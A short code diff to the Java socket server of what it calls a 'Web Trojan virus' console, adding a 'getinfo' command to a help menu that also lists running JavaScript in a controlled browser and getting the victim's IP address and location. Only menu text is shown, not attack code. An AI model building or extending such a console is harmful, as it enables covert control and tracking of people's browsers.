@@ -27,9 +27,10 @@ public class SocketServer {
                         System.out.println(" |-Help-|\n" +
                                 " 1. jsconsole                      Run javascript on control browser.\n" +
                                 " 2. getip                          Get Controlled-end's IP address.\n" +
-                                " 3. getlocation                    Get Controlled-end's location information.\n" +
-                                " 4. close                          Close the Controlled-end's javascript Trojan virus.\n" +
-                                " 5. exit                           Exit from Web Trojan virus console.\n");
+				" 3. getinfo			    Get the information." +
+                                " 4. getlocation                    Get Controlled-end's location information.\n" +
+                                " 5. close                          Close the Controlled-end's javascript Trojan virus.\n" +
+                                " 6. exit                           Exit from Web Trojan virus console.\n");
                         continue;
                     }
                     if (command.equals("jsconsole")) {
